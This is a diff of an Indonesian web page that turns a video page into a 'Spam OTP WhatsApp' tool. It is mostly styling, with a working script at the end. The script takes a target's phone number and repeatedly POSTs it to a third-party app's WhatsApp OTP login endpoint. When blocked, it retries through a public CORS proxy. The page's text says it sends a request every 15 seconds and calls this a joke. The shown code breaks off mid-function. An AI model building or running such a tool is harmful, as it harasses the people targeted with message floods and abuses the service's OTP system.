@@ -1,40 +1,1322 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Web Video | Sakha</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WEB TOOLS SPAM OTP WA</title>
+    <style>
+        :root {
+    --primary-bg: #05070a;
+    --secondary-bg: #0b0f14;
+    --card-bg: rgba(15, 20, 30, 0.75);
 
-<style>
-* {
-  margin: 0;
-  padding: 0;
-  box-sizing: border-box;
-  font-family: Arial, Helvetica, sans-serif;
+    --accent-color: #8fd3ff;
+    --text-primary: #e6f7ff;
+    --text-secondary: #9fb3c8;
+
+    --border-color: rgba(150, 200, 255, 0.15);
+
+    --success-color: #9effc3;
+    --error-color: #ff9ea1;
+
+    --shadow: 0 10px 40px rgba(0, 150, 255, 0.15);
 }
 
-body {
-  background: #0f0f0f;
-  color: #fff;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  min-height: 100vh;
+        body {
+            background: var(--primary-bg);
+            color: var(--text-primary);
+            font-family: 'Inter', 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: radial-gradient(circle at top,#0a1220, #020409 80%);
+            min-height: 100vh;
+            line-height: 1.6;
+            overflow-x: hidden;
+            position: relative;
+        }
+        
+        /* MAIN LAYOUT STYLES */
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .main-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 0;
+            margin-bottom: 40px;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .brand {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .logo {
+            width: 70px;
+            height: 70px;
+            border-radius: 12px;
+            background: transparent;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 20px;
+            color: var(--primary-bg);
+        }
+
+        .brand-text h1 {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 4px;
+            color: #fff;
+            font-family: 'Orbitron', sans-serif;
+            text-shadow: 0 0 10px rgba(150,220,255, 0.7);
+        }
+
+        .brand-text p {
+            color: #aaa;
+            font-size: 14px;
+        }
+
+.music-control {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 12px;
+    background: var(--card-bg);
+    margin-top: 15px;
+    width: 100%;
+    padding: 10px 20px;
+    border-radius: 50px;
+    border: 1px solid var(--border-color);
+    backdrop-filter: blur(10px);
+
+    box-sizing: border-box;
 }
 
-.container {
-  width: 90%;
-  max-width: 800px;
-  text-align: center;
+        .music-btn {
+            width: 45px;
+            height: 45px;
+            border: none;
+            border-radius: 50%;
+            background: #1a1a1a;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            transition: 0.25s ease;
+        }
+
+        .music-btn:hover {
+            background: #343434;
+            transform: scale(1.06);
+        }
+
+        .music-status {
+            display: flex;
+            flex-direction: column;
+            line-height: 1.2;
+        }
+
+        #musicText {
+            font-size: 15px;
+            font-weight: 500;
+            color: #e5e5e5;
+            font-family: "Poppins", sans-serif;
+        }
+
+        #musicState {
+            font-size: 12px;
+            font-weight: bold;
+            margin-top: 2px;
+            font-family: "Poppins", sans-serif;
+        }
+
+        #musicState.on {
+            color: #17ff45;
+            text-shadow: 0 0 6px #17ff45;
+        }
+
+        #musicState.off {
+            color: #ff2b2b;
+            text-shadow: 0 0 6px #ff2b2b;
+        }
+
+        .dashboard {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 30px;
+            margin-bottom: 40px;
+        }
+
+        .card {
+    background: rgba(20, 30, 50, 0.55);
+    backdrop-filter: blur(14px);
+    border: 1px solid rgba(200, 230, 255, 0.2);
+    border-radius: 20px;
+    padding: 30px;
+    box-shadow: 0 10px 40px rgba(0, 150, 255, 0.15);
 }
 
-h1 {
-  margin-bottom: 15px;
-  font-size: 24px;
+        .card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 0 25px rgba(120, 200, 255, 0.25);
+        }
+
+        .card-header {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin-bottom: 25px;
+        }
+
+        .card-icon {
+            width: 40px;
+            height: 40px;
+            border-radius: 10px;
+            background: rgba(255, 255, 255, 0.1);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 18px;
+        }
+
+        .card-title {
+            font-size: 18px;
+            font-weight: 600;
+        }
+
+        .input-group {
+            margin-bottom: 25px;
+        }
+
+        .input-label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+            color: var(--text-secondary);
+            font-size: 14px;
+        }
+
+        .phone-input {
+            width: 100%;
+            padding: 16px 20px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            color: var(--text-primary);
+            font-size: 16px;
+            transition: var(--transition);
+        }
+
+        .phone-input:focus {
+            outline: none;
+            border-color: rgba(255, 255, 255, 0.3);
+            background: rgba(255, 255, 255, 0.08);
+            box-shadow: 0 0 0 3px rgba(255, 255, 255, 0.1);
+        }
+
+        .phone-input::placeholder {
+            color: var(--text-secondary);
+            font-weight: 500;
+        }
+        
+        .phone-wrapper {
+    position: relative;
+    display: flex;
+    align-items: center;
+    gap: 10px;
 }
 
-video {
-  width: 100%;
+.country-select {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    padding: 12px;
+    background: rgba(255, 255, 255, 0.05);
+    border: 1px solid rgba(255, 255, 255, 0.1);
+    border-radius: 12px;
+    cursor: pointer;
+}
+
+.country-select img {
+    width: 22px;
+    height: 16px;
+    border-radius: 2px;
+}
+
+.country-dropdown {
+    position: absolute;
+    top: 60px;
+    left: 0;
+    width: 220px;
+    background: #111;
+    border: 1px solid rgba(255, 255, 255, 0.1);
+    border-radius: 12px;
+    display: none;
+    z-index: 10;
+}
+
+.country-dropdown div {
+    padding: 10px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    cursor: pointer;
+}
+
+.country-dropdown div:hover {
+    background: rgba(255, 255, 255, 0.05);
+}
+
+.country-dropdown img {
+    width: 22px;
+}
+
+        .control-panel {
+            display: flex;
+            gap: 10px;
+            margin: 25px 0;
+        }
+
+        .btn {
+            padding: 16px 28px;
+            border: none;
+            border-radius: 12px;
+            font-weight: 600;
+            font-size: 15px;
+            cursor: pointer;
+            transition: var(--transition);
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        .btn-primary {
+            background: rgba(255, 255, 255, 0.9);
+            color: #000;
+        }
+
+        .btn-primary:hover:not(:disabled) {
+            background: #fff;
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(255, 255, 255, 0.2);
+        }
+
+        .btn-secondary {
+            background: rgba(255, 255, 255, 0.1);
+            color: var(--text-primary);
+            border: 1px solid var(--border-color);
+        }
+
+        .btn-secondary:hover:not(:disabled) {
+            background: rgba(255, 255, 255, 0.15);
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(255, 255, 255, 0.1);
+        }
+
+        .btn:disabled {
+            opacity: 0.4;
+            cursor: not-allowed;
+            transform: none !important;
+        }
+
+        .status-dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background: #8fd3ff;
+            box-shadow: 0 0 12px #8fd3ff;
+        }
+
+        .status-text {
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .log-container {
+            margin-top: 30px;
+        }
+
+        .log-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+
+        .log-actions {
+            display: flex;
+            gap: 10px;
+        }
+
+        .btn-sm {
+            padding: 8px 16px;
+            font-size: 13px;
+            border-radius: 8px;
+        }
+
+        #log {
+            background: rgba(0, 0, 0, 0.3);
+            color: var(--text-primary);
+            padding: 20px;
+            border-radius: 12px;
+            height: 300px;
+            overflow-y: auto;
+            font-size: 14px;
+            line-height: 1.5;
+            border: 1px solid var(--border-color);
+            font-family: 'JetBrains Mono', 'Fira Code', monospace;
+        }
+
+        .log-time {
+            color: var(--text-secondary);
+            font-size: 12px;
+            min-width: 80px;
+        }
+
+        .log-message {
+            flex: 1;
+        }
+
+        .log-success { color: var(--success-color); }
+        .log-error { color: var(--error-color); opacity: 0.7; }
+        .log-info { color: var(--text-primary); }
+        .log-warning { color: var(--text-primary); font-weight: 500; }
+
+        .footer {
+            text-align: center;
+            padding: 30px 0;
+            margin-top: 50px;
+            border-top: 1px solid var(--border-color);
+            color: var(--text-secondary);
+            font-size: 14px;
+        }
+
+        .social-links {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 15px;
+        }
+
+        .social-link {
+            padding: 10px 20px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            color: var(--text-primary);
+            text-decoration: none;
+            font-weight: 500;
+            transition: var(--transition);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-size: 14px;
+        }
+
+        .social-link:hover {
+            background: rgba(255, 255, 255, 0.1);
+            transform: translateY(-2px);
+        }
+
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 4px;
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 4px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: rgba(255, 255, 255, 0.3);
+        }
+        
+        .snowfall {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    pointer-events: none;
+    z-index: -1;
+}
+
+.snowflake {
+    position: absolute;
+    top: -10px;
+    color: #cfe9ff;
+    opacity: 0.8;
+    animation: fall linear infinite;
+    filter: blur(0.5px);
+}
+
+@keyframes fall {
+    0% {
+        transform: translateY(-10px);
+    }
+    100% {
+        transform: translateY(100vh);
+    }
+}
+
+        @media (max-width: 1024px) {
+            .dashboard {
+                grid-template-columns: 1fr;
+                gap: 20px;
+            }
+            
+            .container {
+                padding: 15px;
+            }
+        }
+
+        @media (max-width: 768px) {
+    .main-header {
+        flex-direction: column;
+    }
+
+    .control-panel {
+        flex-direction: row; /* tetap sejajar */
+    }
+
+    .card {
+        padding: 20px;
+    }
+}
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .card {
+            animation: fadeIn 0.5s ease-out;
+        }
+
+        .card:nth-child(2) {
+            animation-delay: 0.1s;
+        }
+        
+        .control-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 20px;
+}
+
+.profile-box {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    background: rgba(255, 255, 255, 0.05);
+    border: 1px solid rgba(255, 255, 255, 0.1);
+    width: 80px;
+    height: 80px;
+    border-radius: 16px;
+}
+
+.profile-box span {
+    font-size: 10px;
+    margin-top: 6px;
+    color: #aaa;
+}
+
+.system-status {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+}
+
+.stats-circle-container {
+    display: flex;
+    justify-content: space-between;
+    gap: 15px;
+    margin-top: 20px;
+}
+
+.circle-box {
+    position: relative;
+    width: 130px;
+    height: 130px;
+    border-radius: 50%;
+    background: rgba(255, 255, 255, 0.05);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    overflow: hidden;
+    border: 1px solid rgba(255, 255, 255, 0.1);
+}
+
+.circle-box canvas {
+    position: absolute;
+    width: 100%;
+    height: 100%;
+}
+
+.circle-text {
+    position: relative;
+    text-align: center;
+    z-index: 2;
+}
+
+.circle-text span {
+    font-size: 26px;
+    font-weight: bold;
+}
+
+.circle-text small {
+    font-size: 10px;
+    color: #aaa;
+}
+
+.fog, .fog2 {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 250%;
+    height: 100%;
+    pointer-events: none;
+    z-index: -2;
+
+    background:
+        radial-gradient(circle at 20% 50%, rgba(200,230,255,0.06), transparent 60%),
+        radial-gradient(circle at 80% 50%, rgba(200,230,255,0.04), transparent 60%),
+        radial-gradient(circle at 50% 80%, rgba(200,230,255,0.03), transparent 70%);
+    
+    filter: blur(60px);
+    animation: fogMove 80s linear infinite;
+}
+
+.fog2 {
+    opacity: 0.4;
+    animation-duration: 120s;
+    transform: scaleX(-1);
+}
+
+@keyframes fogMove {
+    0% {
+        transform: translateX(0);
+    }
+    50% {
+        transform: translateX(-10%);
+    }
+    100% {
+        transform: translateX(-25%);
+    }
+}
+
+/* 🔥 glow effect */
+.music-active {
+    animation: pulseGlow 1.2s infinite;
+}
+
+@keyframes pulseGlow {
+    0% { box-shadow: 0 0 10px rgba(120,200,255,0.1); }
+    50% { box-shadow: 0 0 30px rgba(120,200,255,0.4); }
+    100% { box-shadow: 0 0 10px rgba(120,200,255,0.1); }
+}
+
+    100% { box-shadow: 0 0 10px rgba(255,255,255,0.1); }
+}
+
+/* 🔥 equalizer fake */
+.bars {
+    display: flex;
+    gap: 3px;
+    align-items: flex-end;
+}
+
+.bars span {
+    width: 4px;
+    height: 6px;
+    background: #fff;
+    border-radius: 2px;
+    animation: bar 1s infinite;
+}
+
+.bars span:nth-child(2) { animation-delay: 0.2s; }
+.bars span:nth-child(3) { animation-delay: 0.4s; }
+
+@keyframes bar {
+    0%,100% { height: 6px; }
+    50% { height: 18px; }
+}
+
+.bars.off span {
+    animation: none;
+    height: 6px;
+}
+
+/* 🔥 tombol ikut gerak */
+.music-btn.active {
+    animation: bounce 0.6s infinite;
+}
+
+@keyframes bounce {
+    0%,100% { transform: scale(1); }
+    50% { transform: scale(1.15); }
+}
+
+.log-entry {
+    padding: 12px;
+    border-radius: 10px;
+    margin-bottom: 8px;
+    gap: 10px;
+    animation: fadeIn 0.3s ease;
+    border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+    display: flex;
+    align-items: flex-start;
+}
+
+
+.log-success {
+    background: rgba(0, 255, 100, 0.08);
+    border-left: 3px solid #17ff45;
+}
+
+.log-error {
+    background: rgba(255, 50, 50, 0.08);
+    border-left: 3px solid #ff2b2b;
+}
+
+.log-info {
+    background: rgba(255, 255, 255, 0.05);
+}
+
+.log-warning {
+    background: rgba(255, 200, 0, 0.08);
+    border-left: 3px solid #ffc107;
+}
+
+/* TEXT ICE */
+.ice-text {
+    font-size: clamp(20px, 4vw, 40px);
+    font-weight: 900;
+    font-family: 'Impact', 'Arial Black', sans-serif;
+    text-transform: uppercase;
+    letter-spacing: 3px;
+
+    margin: 0;
+    display: inline-block;
+    position: relative;
+    isolation: isolate;
+
+    /* warna es */
+    background: linear-gradient(180deg, #e6f7ff, #8fd3ff);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-color: transparent !important;
+
+    /* glow dingin */
+    text-shadow:
+        0 0 10px rgba(143,211,255,0.6),
+        0 0 25px rgba(143,211,255,0.3);
+
+    transform: rotate(-2deg);
+}
+
+/* RETAK HALUS */
+.ice-text::before {
+    content: "";
+    position: absolute;
+    inset: 0;
+
+    background:
+        repeating-linear-gradient(
+            60deg,
+            rgba(255,255,255,0.15) 0px,
+            rgba(255,255,255,0.15) 1px,
+            transparent 1px,
+            transparent 8px
+        );
+
+    opacity: 0.4;
+    mix-blend-mode: screen;
+    pointer-events: none;
+}
+
+/* PARTIKEL ES */
+.ice-text::after {
+    content: "";
+    position: absolute;
+    inset: 0;
+
+    background:
+        radial-gradient(circle at 20% 30%, rgba(255,255,255,0.5) 1px, transparent 2px),
+        radial-gradient(circle at 70% 60%, rgba(255,255,255,0.4) 1px, transparent 2px),
+        radial-gradient(circle at 40% 80%, rgba(255,255,255,0.3) 1px, transparent 2px);
+
+    opacity: 0.3;
+    mix-blend-mode: screen;
+    filter: blur(1px);
+    pointer-events: none;
+}
+
+/* CONTAINER TENGAH */
+.mid-text {
+    flex: 1;
+    text-align: center;
+    background: transparent;
+
+    /* biar nyatu sama kabut */
+    filter: blur(0.2px) drop-shadow(0 0 15px rgba(143,211,255,0.25));
+}
+
+    </style>
+</head>
+<body>
+    <!-- S -->
+    <div class="snowfall" id="snowfall"></div>
+    <div class="container">
+        <div class="fog"></div>
+<div class="fog fog2"></div>
+        <!-- Header -->
+        <header class="main-header">
+            <div class="brand">
+<div class="logo">
+    <svg viewBox="0 0 100 100" width="70" height="70">
+        <!-- Background gelap -->
+        <circle cx="50" cy="50" r="48" fill="transparent" />
+        
+        <!-- Bulan utama -->
+        <circle cx="50" cy="50" r="25" fill="#dcdcdc" />
+        
+        <!-- Efek bayangan (fase bulan dikit) -->
+        <circle cx="50" cy="50" r="25" fill="#dcdcdc" />
+
+<!-- glow luar -->
+<circle cx="50" cy="50" r="35"
+        fill="none"
+        stroke="#8fd3ff"
+        stroke-opacity="0.2"
+        stroke-width="3">
+    <animate attributeName="r" values="35;38;35" dur="4s" repeatCount="indefinite"/>
+</circle>
+        
+        <!-- Bintang kecil -->
+        <circle cx="20" cy="20" r="1.5" fill="#fff">
+            <animate attributeName="opacity" values="1;0.3;1" dur="2s" repeatCount="indefinite" />
+        </circle>
+        <circle cx="80" cy="30" r="1" fill="#fff">
+            <animate attributeName="opacity" values="1;0.2;1" dur="3s" repeatCount="indefinite" />
+        </circle>
+    </svg>
+</div>
+
+                    </svg>
+                </div>
+
+                <div class="brand-text">
+                    <h1>Spam Otp WhatsApp</h1>
+                    <p>Tools By Khaamells</p>
+                </div>
+            </div>
+        </header>
+        <!-- Main Dashboard -->
+        <div class="dashboard">
+<div class="card">
+    
+    <!-- HEADER -->
+    <div class="control-header">
+        <div class="profile-box">
+            <svg width="30" height="30" viewBox="0 0 24 24" fill="none">
+                <circle cx="12" cy="8" r="4" stroke="#fff" stroke-width="2" />
+                <path d="M4 20c0-4 4-6 8-6s8 2 8 6" stroke="#fff" stroke-width="2" />
+            </svg>
+            <span>Control Panel</span>
+        </div>
+        <div class="hero-text">
+    <h1 class="ice-text">𝔪𝔢𝔩𝔩𝔰</h1>
+</div>
+        <div class="system-status">
+            <div class="status-dot" id="statusDot"></div>
+            <span id="statusText">System Ready</span>
+        </div>
+    </div>
+    
+    <!-- MUSIC -->
+    <div class="music-control" id="musicBox">
+    <button class="music-btn" onclick="toggleMusic()" id="musicBtn">
+        <svg width="22" height="22" viewBox="0 0 24 24">
+            <path id="iconPath" d="M8 5v14l11-7z" fill="#fff" />
+        </svg>
+    </button>
+    
+    <div class="music-status">
+        <span id="musicText">Music</span>
+        <span id="musicState" class="off">OFF</span>
+    </div>
+    
+    <!-- 🔥 fake equalizer -->
+    <div class="bars off" id="bars">
+        <span></span><span></span><span></span>
+    </div>
+    
+    <audio id="bgMusic" loop playsinline preload="auto">
+        <source src="https://files.catbox.moe/ej18h1.mp3" type="audio/mpeg">
+    </audio>
+</div>
+    
+    <!-- INPUT -->
+    <div class="input-group">
+    <label class="input-label">Target Phone Number</label>
+    
+    <div class="phone-wrapper">
+        
+        <div class="country-select" onclick="toggleCountry()">
+            <img id="flag" src="https://flagcdn.com/w40/id.png">
+            <span id="code">+62</span>
+        </div>
+        
+        <input type="text" class="phone-input" id="phoneNumber" placeholder="Input Numbers!">
+        
+        <div class="country-dropdown" id="countryList">
+            <div onclick="selectCountry('id','+62')">
+                <img src="https://flagcdn.com/w40/id.png"> Indonesia (+62)
+            </div>
+            <div onclick="selectCountry('us','+1')">
+                <img src="https://flagcdn.com/w40/us.png"> USA (+1)
+            </div>
+            <div onclick="selectCountry('sg','+65')">
+                <img src="https://flagcdn.com/w40/sg.png"> Singapore (+65)
+            </div>
+            <div onclick="selectCountry('my','+60')">
+                <img src="https://flagcdn.com/w40/my.png"> Malaysia (+60)
+            </div>
+        </div>
+        
+    </div>
+</div>
+    
+    <!-- BUTTON -->
+    <div class="control-panel">
+        <button class="btn btn-primary" id="startBtn" onclick="startSpam()">Start</button>
+<button class="btn btn-secondary" id="stopBtn" onclick="stopSpam()">Stop</button>
+    </div>
+    
+                <div class="stats-circle-container">
+    
+    <div class="circle-box">
+        <canvas id="successWave"></canvas>
+        <div class="circle-text">
+            <span id="successAttempts">0</span>
+            <small>SUCCESS</small>
+        </div>
+    </div>
+    
+    <div class="circle-box">
+        <canvas id="totalWave"></canvas>
+        <div class="circle-text">
+            <span id="totalAttempts">0</span>
+            <small>TOTAL</small>
+        </div>
+    </div>
+    
+</div>
+            
+            <!-- Information Card -->
+            <div class="card">
+                <div class="card-header">
+                    <h2 class="card-title">System Information</h2>
+                </div>
+                
+                <div style="margin-bottom: 20px;">
+    <h3 style="font-size: 16px; margin-bottom: 10px; color: var(--text-secondary);">Cara Kerja</h3>
+    <p style="font-size: 14px; color: var(--text-secondary); line-height: 1.6;">
+        Tools ini mengirim permintaan OTP ke nomor telepon target setiap 15 detik. 
+        Meskipun CORS diblokir, permintaan tetap dicoba dan mungkin berhasil di sisi server. Tools ini dirancang sebagai bahan candaan, bukan dipakai atau disalah gunakan untuk tindakan kejahatan dan semacamnya!
+    </p>
+</div>
+
+<div style="margin-bottom: 20px;">
+    <h3 style="font-size: 16px; margin-bottom: 10px; color: var(--text-secondary);">Petunjuk Penggunaan</h3>
+    <ul style="font-size: 14px; color: var(--text-secondary); line-height: 1.6; padding-left: 20px;">
+        <li>Masukkan nomor telepon yang valid </li>
+        <li>Klik "Start" untuk mulai mengirim permintaan OTP</li>
+        <li>Pantau log aktivitas untuk melihat hasil</li>
+        <li>Klik "Stop" untuk menghentikan pengiriman OTP</li>
+        <li>Ingat gunakan dengan bijak dan bertanggung jawab</li>
+    </ul>
+</div>
+
+<div class="social-links">
+    
+    <a href="https://t.me/KhaamellsArea" class="social-link" target="_blank">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="#fff">
+            <path d="M9.5 15.5l-.4 4c.6 0 .8-.2 1.1-.5l2.7-2.6 5.6 4.1c1 .6 1.8.3 2-.9l3.7-17.2c.3-1.3-.5-1.8-1.5-1.4L1.3 9.7c-1.3.5-1.3 1.3-.2 1.7l5.6 1.7L19.4 5c.6-.4 1.2-.2.7.2" />
+        </svg>
+        Channel Telegram
+    </a>
+    
+    <a href="https://t.me/Khaamells" class="social-link" target="_blank">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="#fff">
+            <circle cx="12" cy="8" r="4" />
+            <path d="M4 20c0-4 4-6 8-6s8 2 8 6" />
+        </svg>
+        User Telegram
+    </a>
+    
+    <a href="https://whatsapp.com/channel/0029VbAjlHHIiRorXrlsfP0w" class="social-link" target="_blank">
+        <svg width="18" height="18" viewBox="0 0 24 24" fill="#fff">
+            <path d="M20 3.5A11.9 11.9 0 0012.1 0C5.6 0 .3 5.3.3 11.8c0 2.1.6 4.1 1.7 5.8L0 24l6.6-2c1.6.9 3.5 1.4 5.4 1.4h.1c6.5 0 11.8-5.3 11.8-11.8 0-3.2-1.2-6.2-3.9-8.1zM12.1 21c-1.7 0-3.4-.5-4.8-1.3l-.3-.2-3.9 1.2 1.3-3.8-.2-.3c-1-1.5-1.6-3.3-1.6-5.1 0-5.3 4.3-9.6 9.6-9.6 2.6 0 5 1 6.8 2.8 1.8 1.8 2.8 4.2 2.8 6.8 0 5.3-4.3 9.6-9.6 9.6zm5.3-7.2c-.3-.2-1.7-.8-2-.9-.3-.1-.5-.2-.7.2-.2.3-.8.9-1 .1-.2-.2-.3-.3-.6-.6-.3-.3-1.2-1-2-2-.6-.8-.1-.7.2-1 .2-.2.3-.3.5-.5.2-.2.2-.3.3-.5.1-.2 0-.4 0-.5 0-.2-.7-1.7-1-2.3-.2-.5-.5-.4-.7-.4h-.6c-.2 0-.5.1-.7.3-.2.2-.9.8-.9 2 0 1.2.9 2.3 1 2.5.1.2 1.8 2.8 4.4 3.9.6.3 1 .5 1.4.6.6.2 1.2.2 1.6.1.5-.1 1.7-.7 2-1.3.2-.6.2-1.2.1-1.3-.1-.2-.3-.3-.6-.5z" />
+        </svg>
+        Channel WhatsApp
+    </a>
+    
+</div>
+        
+        <!-- Log Container -->
+        <div class="card log-container">
+            <div class="log-header">
+                <div class="card-header">
+                    <h2 class="card-title">Activity Log</h2>
+                </div>
+                <div class="log-actions">
+                    <button class="btn btn-secondary btn-sm" onclick="clearLog()">
+                        Clear Log
+                    </button>
+                </div>
+            </div>
+            <div id="log"></div>
+        </div>
+        
+        <!-- Footer -->
+        <footer class="footer">
+            <p>SPAM OTP TOOLS &copy; 2026 | SIMPEL AJA BREE</p>
+        </footer>
+    </div>
+
+    <script>
+        // === MUSIC SYSTEM ===
+        function toggleMusic() {
+    const music = document.getElementById("bgMusic");
+    const iconPath = document.getElementById("iconPath");
+    const stateText = document.getElementById("musicState");
+    const bars = document.getElementById("bars");
+    const box = document.getElementById("musicBox");
+    const btn = document.getElementById("musicBtn");
+    
+    if (music.paused) {
+        music.muted = false;
+        music.volume = 1;
+        
+        music.play().then(() => {
+            iconPath.setAttribute("d", "M6 4h4v16H6zm8 0h4v16h-4z");
+            stateText.innerText = "ON";
+            stateText.classList.remove("off");
+            stateText.classList.add("on");
+            
+            bars.classList.remove("off");
+            box.classList.add("music-active");
+            btn.classList.add("active");
+        }).catch(() => {
+            alert("Klik sekali lagi bro biar musik nyala");
+        });
+        
+    } else {
+        music.pause();
+        iconPath.setAttribute("d", "M8 5v14l11-7z");
+        stateText.innerText = "OFF";
+        stateText.classList.remove("on");
+        stateText.classList.add("off");
+        
+        bars.classList.add("off");
+        box.classList.remove("music-active");
+        btn.classList.remove("active");
+    }
+}
+        
+        // === SNOW EFFECT ===
+function createSnow() {
+    const snowContainer = document.getElementById("snowfall");
+    
+    setInterval(() => {
+        const snow = document.createElement("div");
+        snow.classList.add("snowflake");
+        snow.innerHTML = "❄";
+        
+        snow.style.left = Math.random() * window.innerWidth + "px";
+        snow.style.animationDuration = (Math.random() * 3 + 2) + "s";
+        snow.style.fontSize = (Math.random() * 5 + 8) + "px";
+        
+        snowContainer.appendChild(snow);
+        
+        setTimeout(() => {
+            snow.remove();
+        }, 5000);
+    }, 200);
+}
+
+createSnow();
+
+        // Phone Numbers //
+        function toggleCountry() {
+    const list = document.getElementById("countryList");
+    list.style.display = list.style.display === "block" ? "none" : "block";
+}
+
+function selectCountry(code, dial) {
+    document.getElementById("flag").src = `https://flagcdn.com/w40/${code}.png`;
+    document.getElementById("code").innerText = dial;
+    document.getElementById("countryList").style.display = "none";
+}
+
+        // === SPAMMER SYSTEM ===
+        let isSpamming = false;
+        let spamInterval = null;
+        let totalAttempts = 0;
+        let successAttempts = 0;
+
+        // Update status indicator
+        function updateStatusIndicator() {
+    const text = document.getElementById('statusText');
+    
+    if (isSpamming) {
+        text.textContent = 'Spamming Active';
+    } else {
+        text.textContent = 'System Ready';
+    }
+}
+
+        // Direct API Call to Singa
+        async function sendSingaOTP(phoneNumber) {
+            const url = "https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id=";
+            
+            const payload = {
+                mobile_phone: phoneNumber,
+                type: 'mobile',
+                is_switchable: 1
+            };
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json; charset=utf-8',
+                        'Accept': 'application/json',
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                if (response.ok) {
+                    const data = await response.json();
+                    return {
+                        success: true,
+                        message: 'OTP Singa berhasil dikirim!',
+                        data: data
+                    };
+                } else {
+                    return {
+                        success: false,
+                        error: `HTTP Error: ${response.status}`
+                    };
+                }
+            } catch (error) {
+                return await tryWithProxy(phoneNumber);
+            }
+        }
+
+        // CORS Proxy Fallback
+        async function tryWithProxy(phoneNumber) {
+            const proxyUrl = 'https://cors-anywhere.herokuapp.com/';
+            const targetUrl = "https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id=";
+            
+            const payload = {
+                mobile_phone: phoneNumber,
+                type: 'mobile',
+                is_switchable: 1
+            };
+
+            try {
+                const response = await fetch(proxyUrl + targetUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json; charset=utf-8',
+                        'Accept': 'application/json',
+                        'X-Requested-With': 'XMLHttpRequest'
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                if (response.ok) {
+                    const data = await response.json();
+                    return {
+                        success: true,
+                        message: 'OTP Singa berhasil dikirim via proxy!',
+                        data: data
+                    };
+                } else {
+                    return {
+                        success: false,
+                        error: `Proxy Error: ${response.status}`
+                    };
+                }
+            } catch (proxyError) {
+                return {
+                    success: false,
+                    error: 'CORS blocked - Tapi request mungkin sudah terkirim'
+                };
+            }
+        }
+
+        function addLog(message, type = 'info') {
+    const log = document.getElementById('log');
+    const timestamp = new Date().toLocaleTimeString();
+    
+    let icon = "ℹ️";
+    if (type === "success") icon = "✔️";
+    if (type === "error") icon = "❌";
+    if (type === "warning") icon = "⚠️";
+    
+    const logEntry = document.createElement('div');
+    logEntry.className = `log-entry log-${type}`;
+    logEntry.innerHTML = `
+        <div class="log-time">${timestamp}</div>
+        <div>${icon}</div>
+        <div class="log-message">${message}</div>
+    `;
+    
+    log.appendChild(logEntry);
+    log.scrollTop = log.scrollHeight;
+}
+
+        function clearLog() {
+            document.getElementById('log').innerHTML = '';
+            addLog('Log cleared', 'info');
+        }
+
+        function updateStats() {
+            document.getElementById('totalAttempts').textContent = totalAttempts;
+            document.getElementById('successAttempts').textContent = successAttempts;
+        }
+
+        async function spamCycle(phoneNumber) {
+            if (!isSpamming) return;
+
+            totalAttempts++;
+            updateStats();
+
